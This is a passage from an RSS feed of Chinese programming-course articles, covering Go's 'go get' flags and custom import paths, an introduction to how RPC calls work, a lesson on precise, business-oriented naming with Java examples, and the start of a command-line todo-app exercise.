&lt;li>&lt;code>-fix&lt;/code>：在下载代码包后先运行一个用于根据当前 Go 语言版本修正代码的工具，然后再安装代码包。&lt;/li>
&lt;li>&lt;code>-t&lt;/code>：同时下载测试所需的代码包。&lt;/li>
&lt;li>&lt;code>-insecure&lt;/code>：允许通过非安全的网络协议下载和安装代码包。HTTP 就是这样的协议。&lt;/li>
&lt;/ul>
&lt;p>Go 语言官方提供的&lt;code>go get&lt;/code>命令是比较基础的，其中并没有提供依赖管理的功能。目前 GitHub 上有很多提供这类功能的第三方工具，比如&lt;code>glide&lt;/code>、&lt;code>gb&lt;/code>以及官方出品的&lt;code>dep&lt;/code>、&lt;code>vgo&lt;/code>等等，它们在内部大都会直接使用&lt;code>go get&lt;/code>。&lt;/p>
&lt;p>有时候，我们可能会出于某种目的变更存储源码的代码仓库或者代码包的相对路径。这时，为了让代码包的远程导入路径不受此类变更的影响，我们会使用自定义的代码包导入路径。&lt;/p>
&lt;p>对代码包的远程导入路径进行自定义的方法是：在该代码包中的库源码文件的包声明语句的右边加入导入注释，像这样：&lt;/p>
&lt;pre>&lt;code>package semaphore // import &amp;quot;golang.org/x/sync/semaphore&amp;quot;
&lt;/code>&lt;/pre>
&lt;p>这个代码包原本的完整导入路径是&lt;code>github.com/golang/sync/semaphore&lt;/code>。这与实际存储它的网络地址对应的。该代码包的源码实际存在 GitHub 网站的 golang 组的 sync 代码仓库的 semaphore 目录下。而加入导入注释之后，用以下命令即可下载并安装该代码包了：&lt;/p>
&lt;pre>&lt;code>go get golang.org/x/sync/semaphore
&lt;/code>&lt;/pre>
&lt;p>而 Go 语言官网 golang.org 下的路径 /x/sync/semaphore 并不是存放&lt;code>semaphore&lt;/code>包的真实地址。我们称之为代码包的自定义导入路径。&lt;/p>
&lt;p>不过，这还需要在 golang.org 这个域名背后的服务端程序上，添加一些支持才能使这条命令成功。&lt;/p>
&lt;p>关于自定义代码包导入路径的完整说明可以参看&lt;a href="https://github.com/hyper0x/go_command_tutorial/blob/master/0.3.md">这里&lt;/a>。&lt;/p>
&lt;p>好了，对于&lt;code>go build&lt;/code>命令和&lt;code>go get&lt;/code>命令的简短介绍就到这里。如果你想查阅更详细的文档，那么可以访问 Go 语言官方的&lt;a href="https://golang.google.cn/cmd/go">命令文档页面&lt;/a>，或者在命令行下输入诸如&lt;code>go help build&lt;/code>这类的命令。&lt;/p>
&lt;p>&lt;a href="https://github.com/hyper0x/Golang_Puzzlers">戳此查看 Go 语言专栏文章配套详细代码。&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/35/48/358e4e8578a706598e18a7dfed3ed648.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨核心原理：能否画张图解释下RPC的通信流程？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/01%E4%B8%A8%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%83%BD%E5%90%A6%E7%94%BB%E5%BC%A0%E5%9B%BE%E8%A7%A3%E9%87%8A%E4%B8%8Brpc%E7%9A%84%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/01%E4%B8%A8%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%83%BD%E5%90%A6%E7%94%BB%E5%BC%A0%E5%9B%BE%E8%A7%A3%E9%87%8A%E4%B8%8Brpc%E7%9A%84%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B/</guid><description>
&lt;p>你好，我是何小锋。只要你做过几年开发，那我相信 RPC 这个词你肯定是不陌生了。写专栏之前，我还特意查了下 RPC 的百度指数，发现这些年 RPC 的搜索趋势都是稳步上升的，这也侧面说明了这项技术正在逐步渗透到我们的日常开发中。作为专栏的第一讲，我想只围绕&amp;quot;RPC&amp;quot;这个词，和你聊聊它的定义，它要解决的问题，以及工作原理。&lt;/p>
&lt;p>在前些年，我面试工程师的时候，最喜欢问候选人一个问题，&amp;ldquo;你能否给我解释下 RPC 的通信流程&amp;rdquo;。这问题其实并不难，不过因为很多工程师平时都在用各种框架，他们可能并未停下来思考过框架的原理，所以，问完这问题，有的人就犹豫了，吱唔了半天也没说出所以然来。&lt;/p>
&lt;p>紧接着，我会引导他说，&amp;ldquo;你想想，如果没有 RPC 框架，那你要怎么调用另外一台服务器上的接口呢&amp;rdquo;。你看，这问题可深可浅，也特别考验候选人的基本功。如果你是候选人，你会怎么回答呢？今天我就来试着回答你这个问题。&lt;/p>
&lt;h1 id="什么是-rpc">什么是 RPC？&lt;/h1>
&lt;p>我知道你肯定不喜欢听概念，我也是这样，看书的时候一看到概念就直接略过。不过，到后来，我才发现，&amp;ldquo;定义&amp;quot;是一件多么伟大的事情。当我们能够用一句话把一个东西给定义出来的时候，侧面也说明你已经彻底理解这事了，不仅知道它要解决什么问题，还要知道它的边界。所以，你可以先停下来想想，什么是 RPC。&lt;/p>
&lt;p>RPC 的全称是 Remote Procedure Call，即远程过程调用。简单解读字面上的意思，远程肯定是指要跨机器而非本机，所以需要用到网络编程才能实现，但是不是只要通过网络通信访问到另一台机器的应用程序，就可以称之为 RPC 调用了？显然并不够。&lt;/p>
&lt;p>我理解的 RPC 是帮助我们屏蔽网络编程细节，实现调用远程方法就跟调用本地（同一个项目中的方法）一样的体验，我们不需要因为这个方法是远程调用就需要编写很多与业务无关的代码。&lt;/p>
&lt;p>这就好比建在小河上的桥一样连接着河的两岸，如果没有小桥，我们需要通过划船、绕道等其他方式才能到达对面，但是有了小桥之后，我们就能像在路面上一样行走到达对面，并且跟在路面上行走的体验没有区别。所以&lt;strong>我认为，RPC 的作用就是体现在这样两个方面：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>屏蔽远程调用跟本地调用的区别，让我们感觉就是调用项目内的方法；&lt;/li>
&lt;li>隐藏底层网络通信的复杂性，让我们更专注于业务逻辑。&lt;/li>
&lt;/ul>
&lt;h1 id="rpc-通信流程">RPC 通信流程&lt;/h1>
&lt;p>理解了什么是 RPC，接下来我们讲下 RPC 框架的通信流程，方便我们进一步理解 RPC。&lt;/p>
&lt;p>如前面所讲，RPC 能帮助我们的应用透明地完成远程调用，发起调用请求的那一方叫做调用方，被调用的一方叫做服务提供方。为了实现这个的目标，我们就需要在 RPC 框架里面对整个通信细节进行封装，&lt;strong>那一个完整的 RPC 会涉及到哪些步骤呢？&lt;/strong>&lt;/p>
&lt;p>我们已经知道 RPC 是一个远程调用，那肯定就需要通过网络来传输数据，并且 RPC 常用于业务系统之间的数据交互，需要保证其可靠性，所以 RPC 一般默认采用 TCP 来传输。我们常用的 HTTP 协议也是建立在 TCP 之上的。&lt;/p>
&lt;p>网络传输的数据必须是二进制数据，但调用方请求的出入参数都是对象。对象是肯定没法直接在网络中传输的，需要提前把它转成可传输的二进制，并且要求转换算法是可逆的，这个过程我们一般叫做&amp;quot;序列化&amp;rdquo;。&lt;/p>
&lt;p>调用方持续地把请求参数序列化成二进制后，经过 TCP 传输给了服务提供方。服务提供方从 TCP 通道里面收到二进制数据，那如何知道一个请求的数据到哪里结束，是一个什么类型的请求呢？&lt;/p>
&lt;p>在这里我们可以想想高速公路，它上面有很多出口，为了让司机清楚地知道从哪里出去，管理部门会在路上建立很多指示牌，并在指示牌上标明下一个出口是哪里、还有多远。那回到数据包识别这个场景，我们是不是也可以建立一些&amp;quot;指示牌&amp;quot;，并在上面标明数据包的类型和长度，这样就可以正确的解析数据了。确实可以，并且我们把数据格式的约定内容叫做&amp;quot;协议&amp;quot;。大多数的协议会分成两部分，分别是数据头和消息体。数据头一般用于身份识别，包括协议标识、数据大小、请求类型、序列化类型等信息；消息体主要是请求的业务参数信息和扩展属性等。&lt;/p>
&lt;p>根据协议格式，服务提供方就可以正确地从二进制数据中分割出不同的请求来，同时根据请求类型和序列化类型，把二进制的消息体逆向还原成请求对象。这个过程叫作&amp;quot;反序列化&amp;quot;。&lt;/p>
&lt;p>服务提供方再根据反序列化出来的请求对象找到对应的实现类，完成真正的方法调用，然后把执行结果序列化后，回写到对应的 TCP 通道里面。调用方获取到应答的数据包后，再反序列化成应答对象，这样调用方就完成了一次 RPC 调用。&lt;/p>
&lt;p>&lt;strong>那上述几个流程就组成了一个完整的 RPC 吗？&lt;/strong>&lt;/p>
&lt;p>在我看来，还缺点东西。因为对于研发人员来说，这样做要掌握太多的 RPC 底层细节，需要手动写代码去构造请求、调用序列化，并进行网络调用，整个 API 非常不友好。&lt;/p>
&lt;p>那我们有什么办法来简化 API，屏蔽掉 RPC 细节，让使用方只需要关注业务接口，像调用本地一样来调用远程呢？&lt;/p>
&lt;p>如果你了解 Spring，一定对其 AOP 技术很佩服，其核心是采用动态代理的技术，通过字节码增强对方法进行拦截增强，以便于增加需要的额外处理逻辑。其实这个技术也可以应用到 RPC 场景来解决我们刚才面临的问题。&lt;/p>
&lt;p>由服务提供者给出业务接口声明，在调用方的程序里面，RPC 框架根据调用的服务接口提前生成动态代理实现类，并通过依赖注入等技术注入到声明了该接口的相关业务逻辑里面。该代理实现类会拦截所有的方法调用，在提供的方法处理逻辑里面完成一整套的远程调用，并把远程调用结果返回给调用方，这样调用方在调用远程方法的时候就获得了像调用本地接口一样的体验。&lt;/p>
&lt;p>到这里，一个简单版本的 RPC 框架就实现了。我把整个流程都画出来了，供你参考：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/ac/fa/acf53138659f4982bbef02acdd30f1fa.jpg" alt="">&lt;/p>
&lt;h1 id="rpc-在架构中的位置">RPC 在架构中的位置&lt;/h1>
&lt;p>围绕 RPC 我们讲了这么多，那 RPC 在架构中究竟处于什么位置呢？&lt;/p>
&lt;p>如刚才所讲，RPC 是解决应用间通信的一种方式，而无论是在一个大型的分布式应用系统还是中小型系统中，应用架构最终都会从&amp;quot;单体&amp;quot;演进成&amp;quot;微服务化&amp;quot;，整个应用系统会被拆分为多个不同功能的应用，并将它们部署在不同的服务器中，而应用之间会通过 RPC 进行通信，可以说 RPC 对应的是整个分布式应用系统，就像是&amp;quot;经络&amp;quot;一样的存在。&lt;/p>
&lt;p>那么如果没有 RPC，我们现实中的开发过程是怎样的一个体验呢？&lt;/p>
&lt;p>所有的功能代码都会被我们堆砌在一个大项目中，开发过程中你可能要改一行代码，但改完后编译会花掉你 2 分钟，编译完想运行起来验证下结果可能要 5 分钟，是不是很酸爽？更难受的是在人数比较多的团队里面，多人协同开发的时候，如果团队其他人把接口定义改了，你连编译通过的机会都没有，系统直接报错，从而导致整个团队的开发效率都会非常低下。而且当我们准备要上线发版本的时候，QA 也很难评估这次的测试范围，为了保险起见我们只能把所有的功能进行回归测试，这样会导致我们上线新功能的整体周期都特别长。&lt;/p>
&lt;p>无论你是研发还是架构师，我相信这种系统架构我们肯定都不能接受，那怎么才能解决这个问题呢？&lt;/p>
&lt;p>我们首先都会想到可以采用&amp;quot;分而治之&amp;quot;的思想来进行拆分，但是拆分完的系统怎么保持跟未拆分前的调用方式一样呢？我们总不能因为架构升级，就把所有的代码都推倒重写一遍吧。&lt;/p>
&lt;p>**RPC 框架能够帮助我们解决系统拆分后的通信问题，并且能让我们像调用本地一样去调用远程方法。**利用 RPC 我们不仅可以很方便地将应用架构从&amp;quot;单体&amp;quot;演进成&amp;quot;微服务化&amp;quot;，而且还能解决实际开发过程中的效率低下、系统耦合等问题，这样可以使得我们的系统架构整体清晰、健壮，应用可运维度增强。&lt;/p>
&lt;p>当然 RPC 不仅可以用来解决通信问题，它还被用在了很多其他场景，比如：发 MQ、分布式缓存、数据库等。下图是我之前开发的一个应用架构图：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/50/be/506e902e06e91663334672c29bfbc2be.jpg" alt="">&lt;/p>
&lt;p>在这个应用中，我使用了 MQ 来处理异步流程、Redis 缓存热点数据、MySQL 持久化数据，还有就是在系统中调用另外一个业务系统的接口，对我的应用来说这些都是属于 RPC 调用，而 MQ、MySQL 持久化的数据也会存在于一个分布式文件系统中，他们之间的调用也是需要用 RPC 来完成数据交互的。&lt;/p>
&lt;p>由此可见，RPC 确实是我们日常开发中经常接触的东西，只是被包装成了各种框架，导致我们很少意识到这就是 RPC，让 RPC 变成了我们最&amp;quot;熟悉的陌生人&amp;quot;。现在，回过头想想，我说 RPC 是整个应用系统的&amp;quot;经络&amp;quot;，这不为过吧？我们真的很有必要学好 RPC，不仅因为 RPC 是构建复杂系统的基石，还是提升自身认知的利器。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>本讲我主要讲了下 RPC 的原理，RPC 就是提供一种透明调用机制，让使用者不必显式地区分本地调用和远程调用。RPC 虽然可以帮助开发者屏蔽远程调用跟本地调用的区别，但毕竟涉及到远程网络通信，所以这里还是有很多使用上的区别，比如：&lt;/p>
&lt;ul>
&lt;li>调用过程中超时了怎么处理业务？&lt;/li>
&lt;li>什么场景下最适合使用 RPC？&lt;/li>
&lt;li>什么时候才需要考虑开启压缩？&lt;/li>
&lt;/ul>
&lt;p>无论你是一个初级开发者还是高级开发者，RPC 都应该是你日常开发过程中绕不开的一个话题，所以作为软件开发者的我们，真的很有必要详细地了解 RPC 实现细节。只有这样，才能帮助我们更好地在日常工作中使用 RPC。&lt;/p>
&lt;h1 id="课后思考">课后思考&lt;/h1>
&lt;ul>
&lt;li>你应用中有哪些地方用到了 RPC？&lt;/li>
&lt;li>你认为，RPC 使用过程中需要注意哪些问题？&lt;/li>
&lt;/ul>
&lt;p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友，邀请他加入学习。我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 01丨缺乏业务含义的命名：如何精准命名？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/01%E4%B8%A8%E7%BC%BA%E4%B9%8F%E4%B8%9A%E5%8A%A1%E5%90%AB%E4%B9%89%E7%9A%84%E5%91%BD%E5%90%8D%E5%A6%82%E4%BD%95%E7%B2%BE%E5%87%86%E5%91%BD%E5%90%8D/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/01%E4%B8%A8%E7%BC%BA%E4%B9%8F%E4%B8%9A%E5%8A%A1%E5%90%AB%E4%B9%89%E7%9A%84%E5%91%BD%E5%90%8D%E5%A6%82%E4%BD%95%E7%B2%BE%E5%87%86%E5%91%BD%E5%90%8D/</guid><description>
&lt;p>你好，我是郑晔。&lt;/p>
&lt;p>讲写代码的书通常都会从命名开始讲，《程序设计实践》如此，《代码整洁之道》亦然。所以，我们这个讲代码坏味道的专栏，也遵循传统，从命名开始讲。&lt;/p>
&lt;p>不过，也许你会说：&amp;ldquo;我知道，命名不就是不能用 abcxyz 命名，名字要有意义嘛，这有什么好讲的。&amp;ldquo;然而，即便懂得了名字要有意义这个道理，很多程序员依然无法从命名的泥潭中挣脱出来。&lt;/p>
&lt;h1 id="不精准的命名">不精准的命名&lt;/h1>
&lt;p>我们先来看一段代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void processChapter(long chapterId) {
Chapter chapter = this.repository.findByChapterId(chapterId);
if (chapter == null) {
throw new IllegalArgumentException(&amp;#34;Unknown chapter [&amp;#34; + chapterId + &amp;#34;]&amp;#34;);
}
chapter.setTranslationState(TranslationState.TRANSLATING);
this.repository.save(chapter);
}
&lt;/code>&lt;/pre>&lt;p>这是一段看上去还挺正常的代码，甚至以很多团队的标准来看，这段代码写得还不错。但如果我问你，这段代码是做什么的。你就需要调动全部注意力，去认真阅读这段代码，找出其中的逻辑。经过阅读我们发现，这段代码做的就是把一个章节的翻译状态改成翻译中。&lt;/p>
&lt;p>问题来了，为什么你需要阅读这段代码的细节，才能知道这段代码是做什么的？&lt;/p>
&lt;p>问题就出在函数名上。这个函数的名字叫 processChapter（处理章节），这个函数确实是在处理章节，但是，这个名字太过宽泛。如果说&amp;quot;将章节的翻译状态改成翻译中&amp;quot;叫做处理章节，那么&amp;quot;将章节的翻译状态改成翻译完&amp;quot;是不是也叫处理章节呢？&amp;ldquo;修改章节内容&amp;quot;是不是也叫处理章节呢？换句话说，如果各种场景都能够叫处理章节，那么处理章节就是一个过于宽泛的名字，没有错，但不精准。&lt;/p>
&lt;p>这就是一类典型的命名问题，从表面上看，这个名字是有含义的，但实际上，它并不能有效地反映这段代码的含义。如果说我在做的是一个信息处理系统，你根本无法判断，我做是一个电商平台，还是一个图书管理系统，从沟通的角度看，这就不是一个有效的沟通。要想理解它，你需要消耗大量认知成本，无论是时间，还是精力。&lt;/p>
&lt;p>&lt;strong>命名过于宽泛，不能精准描述，这是很多代码在命名上存在的严重问题，也是代码难以理解的根源所在&lt;/strong>。&lt;/p>
&lt;p>或许这么说你的印象还是不深刻，我们看看下面这些词是不是经常出现在你的代码里：data、info、flag、process、handle、build、maintain、manage、modify 等等。这些名字都属于典型的过于宽泛的名字，当这些名字出现在你的代码里，多半是写代码的人当时没有想好用什么名字，就开始写代码了。我相信，只要稍微仔细想想，类似的名字你一定还能想出不少来。&lt;/p>
&lt;p>回到前面那段代码上，如果它不叫&amp;quot;处理章节&amp;rdquo;，那应该叫什么呢？首先，&lt;strong>命名要能够描述出这段代码在做的事情&lt;/strong>。这段代码在做的事情就是&amp;quot;将章节修改为翻译中&amp;rdquo;。那是不是它就应该叫 changeChapterToTranlsating 呢？&lt;/p>
&lt;p>不可否认，相比于&amp;quot;处理章节&amp;rdquo;，changeChapterToTranlsating 这个名字已经进了一步，然而，它也不算是一个好名字，因为它更多的是在描述这段代码在做的细节。我们之所以要将一段代码封装起来，一个重要的原因就是，我们不想知道那么多的细节。如果把细节平铺开来，那本质上和直接阅读代码细节差别并不大。&lt;/p>
&lt;p>所以，&lt;strong>一个好的名字应该描述意图，而非细节。&lt;/strong>&lt;/p>
&lt;p>就这段代码而言， 我们为什么要把翻译状态修改成翻译中，这一定是有原因的，也就是意图。具体到这里的业务，我们把翻译状态修改成翻译中，是因为我们在这里开启了一个翻译的过程。所以，这段函数应该命名 startTranslation。&lt;/p>
&lt;pre tabindex="0">&lt;code>public void startTranslation(long chapterId) {
Chapter chapter = this.repository.findByChapterId(chapterId);
if (chapter == null) {
throw new IllegalArgumentException(&amp;#34;Unknown chapter [&amp;#34; + chapterId + &amp;#34;]&amp;#34;);
}
chapter.setTranslationState(TranslationState.TRANSLATING);
this.repository.save(chapter);
}
&lt;/code>&lt;/pre>&lt;h1 id="用技术术语命名">用技术术语命名&lt;/h1>
&lt;p>我们再来看一段代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>List&amp;lt;Book&amp;gt; bookList = service.getBooks();
&lt;/code>&lt;/pre>&lt;p>可以说这是一段常见得不能再常见的代码了，但这段代码却隐藏另外一个典型得不能再典型的问题：&lt;strong>用技术术语命名。&lt;/strong>&lt;/p>
&lt;p>这个 bookList 变量之所以叫 bookList，原因就是它声明的类型是 List。这种命名在代码中几乎是随处可见的，比如 xxxMap、xxxSet。&lt;/p>
&lt;p>这是一种不费脑子的命名方式，但是，这种命名却会带来很多问题，因为它是一种基于实现细节的命名方式。&lt;/p>
&lt;p>我们都知道，编程有一个重要的原则是面向接口编程，这个原则从另外一个角度理解，就是不要面向实现编程，&lt;strong>因为接口是稳定的，而实现是易变的&lt;/strong>。虽然在大多数人的理解里，这个原则是针对类型的，但在命名上，我们也应该遵循同样的原则。为什么？我举个例子你就知道了。&lt;/p>
&lt;p>比如，如果我发现，我现在需要的是一个不重复的作品集合，也就是说，我需要把这个变量的类型从 List 改成 Set。变量类型你一定会改，但变量名你会改吗？这还真不一定，一旦出现遗忘，就会出现一个奇特的现象，一个叫 bookList 的变量，它的类型是一个 Set。这样，一个新的混淆就此产生了。&lt;/p>
&lt;p>那有什么更好的名字吗？我们需要一个更面向意图的名字。其实，我们在这段代码里真正要表达的是拿到了一堆书，所以，这个名字可以命名成 books。&lt;/p>
&lt;pre tabindex="0">&lt;code>List&amp;lt;Book&amp;gt; books = service.getBooks();
&lt;/code>&lt;/pre>&lt;p>也许你发现了，这个名字其实更简单，但从表意的程度上来说，它却是一个更有效的名字。&lt;/p>
&lt;p>虽然这里我们只是以变量为例说明了以技术术语命名存在的问题，事实上，**在实际的代码中，技术名词的出现，**&lt;strong>往往就代表着它缺少了一个应有的模型。&lt;/strong>&lt;/p>
&lt;p>比如，在业务代码里如果直接出现了 Redis：&lt;/p>
&lt;pre tabindex="0">&lt;code>public Book getByIsbn(String isbn) {
Book cachedBook = redisBookStore.get(isbn);
if (cachedBook != null) {
return cachedBook;
}
Book book = doGetByIsbn(isbn);
redisBookStore.put(isbn, book);
return book;
}
&lt;/code>&lt;/pre>&lt;p>通常来说，这里真正需要的是一个缓存。Redis 是缓存这个模型的一个实现：&lt;/p>
&lt;pre tabindex="0">&lt;code>public Book getByIsbn(String isbn) {
Book cachedBook = cache.get(isbn);
if (cachedBook != null) {
return cachedBook;
}
Book book = doGetByIsbn(isbn);
cache.put(isbn, book);
return book;
}
&lt;/code>&lt;/pre>&lt;p>再进一步，缓存这个概念其实也是一个技术术语，从某种意义上说，它也不应该出现在业务代码中。这方面做得比较好的是 Spring。使用 Spring 框架时，如果需要缓存，我们通常是加上一个 Annotation（注解）：&lt;/p>
&lt;pre tabindex="0">&lt;code>@Cacheable(&amp;#34;books&amp;#34;)
public Book getByIsbn(String isbn) {
...
}
&lt;/code>&lt;/pre>&lt;p>程序员之所以喜欢用技术名词去命名，一方面是因为，这是大家习惯的语言，另一方面也是因为程序员学习写代码，很大程度上是参考别人的代码，而行业里面优秀的代码常常是一些开源项目，而这些开源项目往往是技术类的项目。&lt;strong>在一个技术类的项目中，这些技术术语其实就是它的业务语言。但对于业务项目，这个说法就必须重新审视了。&lt;/strong>&lt;/p>
&lt;p>如果这个部分的代码确实就是处理一些技术，使用技术术语无可厚非，但如果是在处理业务，就要尽可能把技术术语隔离开来。&lt;/p>
&lt;h1 id="用业务语言写代码">用业务语言写代码&lt;/h1>
&lt;p>无论是不精准的命名也好，技术名词也罢，归根结底，体现的是同一个问题：对业务理解不到位。&lt;/p>
&lt;p>我在《10x 程序员工作法》专栏中曾经说过，&lt;strong>编写可维护的代码要使用业务语言&lt;/strong>。怎么才知道自己的命名是否用的是业务语言呢？一种简单的做法就是，把这个词讲给产品经理，看他知不知道是怎么回事。&lt;/p>
&lt;p>从团队的角度看，让每个人根据自己的理解来命名，确实就有可能出现千奇百怪的名字，所以，一个良好的团队实践是，&lt;strong>建立团队的词汇表&lt;/strong>，让团队成员有信息可以参考。&lt;/p>
&lt;p>团队对于业务有了共同理解，我们也许就可以发现一些更高级的坏味道，比如说下面这个函数声明：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void approveChapter(long chapterId, long userId) {
...
}
&lt;/code>&lt;/pre>&lt;p>这个函数的意图是，确认章节内容审核通过。这里有一个问题，chapterId 是审核章节的 ID，这个没问题，但 userId 是什么呢？了解了一下背景，我们才知道，之所以这里要有一个 userId，是因为这里需要记录一下审核人的信息，这个 userId 就是审核人的 userId。&lt;/p>
&lt;p>你看，通过业务的分析，我们会发现，这个 userId 并不是一个好的命名，因为它还需要更多的解释，更好的命名是 reviewerUserId，之所以起这个名字，因为这个用户在这个场景下扮演的角色是审核人（Reviewer）。&lt;/p>
&lt;pre tabindex="0">&lt;code>public void approveChapter(long chapterId, long reviewerUserId) {
...
}
&lt;/code>&lt;/pre>&lt;p>从某种意义上来说，这个坏味道也是一种不精准的命名，但它不是那种一眼可见的坏味道，&lt;strong>而是需要在业务层面上再进行讨论&lt;/strong>，所以，它是一种更高级的坏味道。&lt;/p>
&lt;p>我初入职场的时候，有一次为一个名字陷入了沉思，一个工作经验丰富的同事对此的评价是：你开始进阶了。确实，能够意识到自己的命名有问题，是程序员进阶的第一步。&lt;/p>
&lt;h1 id="总结时刻">总结时刻&lt;/h1>
&lt;p>我们今天讲了两个典型的命名坏味道：&lt;/p>
&lt;ul>
&lt;li>不精准的命名；&lt;/li>
&lt;li>用技术术语命名。&lt;/li>
&lt;/ul>
&lt;p>命名是软件开发中两件难事之一（另一个难事是缓存失效），不好的命名本质上是增加我们的认知成本，同样也增加了后来人（包括我们自己）维护代码的成本。&lt;/p>
&lt;p>好的命名要体现出这段代码在做的事情，而无需展开代码了解其中的细节，这是最低的要求。再进一步，好的命名要准确地体现意图，而不是实现细节。更高的要求是，用业务语言写代码。&lt;/p>
&lt;p>至此，我们已经对命名有了一个更深入的认识。下一讲，我们来说说国外那些经典的讲编码的书都不曾覆盖到的一个话题：英文命名。&lt;/p>
&lt;p>如果今天的内容你只能记住一件事，那请记住：&lt;strong>好的命名，是体现业务含义的命名&lt;/strong>。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/4e/66/4e725dfea2eeb16ef0f654813ca42066.jpg" alt="">&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>前面我们提到了一些代码中常见的不精准的命名所用的词汇，你还能想到哪些词呢？欢迎在留言区分享你的想法。也欢迎你把这节课分享给你身边对命名问题感到困惑的朋友。&lt;/p>
&lt;p>感谢阅读，我们下一讲再见！&lt;/p>
&lt;p>参考资料: 你的代码为谁而写？&lt;/p></description></item><item><title>极客专栏: 01丨课前热身丨这些需求给到你，你会怎么写代码？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/01%E4%B8%A8%E8%AF%BE%E5%89%8D%E7%83%AD%E8%BA%AB%E4%B8%A8%E8%BF%99%E4%BA%9B%E9%9C%80%E6%B1%82%E7%BB%99%E5%88%B0%E4%BD%A0%E4%BD%A0%E4%BC%9A%E6%80%8E%E4%B9%88%E5%86%99%E4%BB%A3%E7%A0%81/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/01%E4%B8%A8%E8%AF%BE%E5%89%8D%E7%83%AD%E8%BA%AB%E4%B8%A8%E8%BF%99%E4%BA%9B%E9%9C%80%E6%B1%82%E7%BB%99%E5%88%B0%E4%BD%A0%E4%BD%A0%E4%BC%9A%E6%80%8E%E4%B9%88%E5%86%99%E4%BB%A3%E7%A0%81/</guid><description>
&lt;p>你好，我是郑晔。&lt;/p>
&lt;p>我在开篇词中提到，缺乏识别代码坏味道的感觉，这才让很多问题代码堂而皇之地留在了自己的眼皮底下。识别坏味道，单纯学理论是不够的，你得结合具体问题进行分析，所以我才在课程中加入了大量真实的代码案例，帮助你理解坏味道。当然，除此之外，你还要有足够多的练习。&lt;/p>
&lt;p>为了让你能够深度地参与到这个专栏的学习中，代码能力得到有效提升，我准备了一个课前热身的环节：大家一起来写代码。&lt;/p>
&lt;p>我们要编写一个待办事项管理的软件，你可以看我下面给出的需求，它是以&lt;strong>命令行应用&lt;/strong>的方式存在的。&lt;/p>
&lt;h1 id="第一阶段基本功能">第一阶段：基本功能&lt;/h1>
&lt;ul>
&lt;li>添加 Todo 项。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo add &amp;lt;item&amp;gt;
1. &amp;lt;item&amp;gt;
Item &amp;lt;itemIndex&amp;gt; added
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>完成 Todo 项。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo done &amp;lt;itemIndex&amp;gt;
Item &amp;lt;itemIndex&amp;gt; done.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>查看 Todo 列表，缺省情况下，只列出未完成的 Todo 项。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo list
1. &amp;lt;item1&amp;gt;
2. &amp;lt;item2&amp;gt;
Total: 2 items
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>使用 all 参数，查看所有的 Todo 项。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo list --all
1. &amp;lt;item1&amp;gt;
2. &amp;lt;item2&amp;gt;
3. [Done] &amp;lt;item3&amp;gt;
Total: 3 items, 1 item done
&lt;/code>&lt;/pre>&lt;p>要求：&lt;/p>
&lt;ul>
&lt;li>Todo 项存储在本地文件中；&lt;/li>
&lt;li>Todo 项索引逐一递增。&lt;/li>
&lt;/ul>
&lt;h1 id="第二阶段支持多用户">第二阶段：支持多用户&lt;/h1>
&lt;ul>
&lt;li>用户登录。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo login -u user
Password:
Login success!
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>用户退出。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo logout
Logout success!
&lt;/code>&lt;/pre>&lt;p>要求：&lt;/p>
&lt;ul>
&lt;li>只能看到当前用户的 Todo 列表；&lt;/li>
&lt;li>同一个用户的 Todo 项索引逐一递增；&lt;/li>
&lt;li>当前用户信息存储在配置文件中 ~/.todo-config。&lt;/li>
&lt;/ul>
&lt;h1 id="第三阶段支持-todo-列表导入和导出">第三阶段：支持 Todo 列表导入和导出&lt;/h1>
&lt;ul>
&lt;li>Todo 列表导出。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo export &amp;gt; todolist
